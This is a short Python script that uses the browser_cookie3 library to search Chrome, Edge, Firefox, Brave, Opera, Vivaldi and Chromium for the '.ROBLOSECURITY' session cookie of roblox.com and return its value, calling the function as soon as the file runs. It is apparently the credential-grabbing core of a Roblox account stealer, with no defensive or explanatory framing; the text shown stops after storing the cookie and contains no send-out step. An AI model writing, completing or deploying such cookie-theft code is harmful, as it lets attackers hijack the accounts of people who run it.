import browser_cookie3

PATHS = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]

def ROBLOSECURITY():
    for LOCAL in PATHS:
        try:
            cookies = getattr(browser_cookie3, LOCAL)(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except:
            continue
    return None

cookie = ROBLOSECURITY()
